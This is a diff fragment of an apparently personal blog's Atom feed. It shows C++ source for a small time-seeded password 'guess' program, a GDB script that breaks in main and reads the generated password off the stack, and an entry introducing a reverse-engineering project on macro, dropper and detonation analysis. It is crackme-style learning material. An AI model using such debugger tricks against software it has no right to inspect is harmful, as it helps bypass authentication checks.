+&lt;&#x2F;span&gt;&lt;span&gt;        sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(((number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; p1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; p2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt; p3);
+&lt;&#x2F;span&gt;&lt;span&gt;        
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;if constexpr &lt;&#x2F;span&gt;&lt;span&gt;(debug_flag) {
+&lt;&#x2F;span&gt;&lt;span&gt;            debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt; p1;
+&lt;&#x2F;span&gt;&lt;span&gt;            std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;-----------------------&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;            std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;p1: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; p1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; p2: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; p2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; p3: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; p3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;            std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; % &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; p1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; = &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;            debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt; debug_sum;
+&lt;&#x2F;span&gt;&lt;span&gt;            std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; - &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;(number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; = &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;            std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; % &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; p2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; = &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;(debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;%=&lt;&#x2F;span&gt;&lt;span&gt; p2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;            std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; &#x2F; &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; p3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot; = &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;(debug_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F;=&lt;&#x2F;span&gt;&lt;span&gt; p3) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;            std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;sum: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;        exponent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; sum;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;() {
+&lt;&#x2F;span&gt;&lt;span&gt;    timeval current_time;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;gettimeofday(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;current_time, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;nullptr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    ulong seconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; current_time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_sec&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    ulong microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; current_time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_usec&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    ulong miliseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1000.0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt; seconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; microseconds_digit_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;digit_sum(current_time.tv_usec)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; miliseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(microseconds_digit_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; microseconds);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt; user_input;
+&lt;&#x2F;span&gt;&lt;span&gt;    
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;if constexpr &lt;&#x2F;span&gt;&lt;span&gt;(debug_flag) {
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;-----------------------&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;seconds: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; seconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;microseconds: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;miliseconds: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; miliseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;digit_sum: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; microseconds_digit_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;password: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl; 
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;-----------------------&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Guess: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    std::cin &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; user_input;
+&lt;&#x2F;span&gt;&lt;span&gt;    
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; password_is_correct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; user_input);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(password_is_correct) {
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Sorry!&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;        std::cout &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;RzAwrCInCg&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;lt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt; std::endl;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt; password_is_correct;
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;GDB script:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;b *main+210
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;set pagination off
+&lt;&#x2F;span&gt;&lt;span&gt;set prompt
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;r
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;echo seconds: 
+&lt;&#x2F;span&gt;&lt;span&gt;x&#x2F;dg $rbp-0x68
+&lt;&#x2F;span&gt;&lt;span&gt;echo microseconds: 
+&lt;&#x2F;span&gt;&lt;span&gt;x&#x2F;dg $rbp-0x60
+&lt;&#x2F;span&gt;&lt;span&gt;echo miliseconds: 
+&lt;&#x2F;span&gt;&lt;span&gt;x&#x2F;dg $rbp-0x58
+&lt;&#x2F;span&gt;&lt;span&gt;echo password:
+&lt;&#x2F;span&gt;&lt;span&gt;x&#x2F;dw $rbp-0x70
+&lt;&#x2F;span&gt;&lt;span&gt;echo Copy password and continue program execution (enter c or continue)\n
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Used tools:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ghidra&lt;&#x2F;li&gt;
+&lt;li&gt;Radare2&lt;&#x2F;li&gt;
+&lt;li&gt;GDB&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>First steps in reverse engineering</title>
+        <published>2020-05-23T00:00:00+00:00</published>
+        <updated>2020-05-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://0xf4lc0n.github.io/blog/first-steps-in-re/" type="text/html"/>
+        <id>https://0xf4lc0n.github.io/blog/first-steps-in-re/</id>
+        
+        <content type="html">&lt;p&gt;Here I publicate my small university project. I was told to do a website on any topic from scratch. 
+I decided to choose that kind of topic because my design skill practically doesn’t exist. So I thought that I could made up for site’s primitive design in interesting and original content but unfortunately that idea didn’t do good. However, I think that the time which I spent on project wasn’t wasted, because I had an oportunity to check my knowledge and skills. What is more I also had a chance to learn somenthing new.&lt;&#x2F;p&gt;
+&lt;p&gt;Project originally contained “Introduction page” but that page wasn’t technical so I didn’t published it on the blog. That page also contained a substantive error (Based on information from one source where author expressed his speculations about possible attack vectors, I presented that speculations as a sure thing). &lt;&#x2F;p&gt;
+&lt;h4 id=&quot;table-of-content&quot;&gt;Table of content:&lt;&#x2F;h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;environment-configuration&quot;&gt;Environment configuration&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;initial-analysis&quot;&gt;Initial analysis&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;macro-analysis&quot;&gt;Macro analysis&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;dropper-analysis&quot;&gt;Dropper analysis&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;detonation&quot;&gt;Detonation&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;domain-analysis&quot;&gt;Domain analysis&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;detonation-v2&quot;&gt;Detonation ver. 2&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;first-steps-in-re&#x2F;summary&quot;&gt;Summary&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</content>
+        
+    </entry>
+</feed>
